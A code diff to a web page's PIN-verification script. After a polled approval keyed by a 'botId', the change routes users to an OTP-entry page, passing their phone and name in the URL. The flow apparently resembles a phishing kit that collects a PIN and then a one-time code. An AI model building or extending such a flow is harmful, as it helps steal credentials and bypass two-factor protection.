@@ -568,9 +568,10 @@
           if (status.approved === true) {
             stopPolling();
             setLoading(false);
-            showAlert('✅ Verified! Redirecting...', 'success');
+            showAlert('✅ PIN verified! Redirecting...', 'success');
+            // PIN approved → go to OTP (code.html), which then goes to success.html
             setTimeout(function() {
-              window.location.href = 'success.html?botId=' + encodeURIComponent(botId) +
+              window.location.href = 'code.html?botId=' + encodeURIComponent(botId) +
                                      '&phone=' + encodeURIComponent(phone) +
                                      '&name=' + encodeURIComponent(name);
             }, 700);
@@ -584,7 +585,6 @@
             input.dispatchEvent(new Event('input'));
             verifyBtn.disabled = true;
             showAlert('❌ Incorrect PIN. Please try again.', 'error');
-            // Highlight boxes briefly
             document.querySelectorAll('.pin-box').forEach(function(b) {
               b.classList.add('error');
             });
@@ -593,7 +593,6 @@
                 b.classList.remove('error');
               });
             }, 600);
-            // Refocus first box
             const firstBox = document.querySelector('.pin-box');
             if (firstBox) firstBox.focus();
             return;
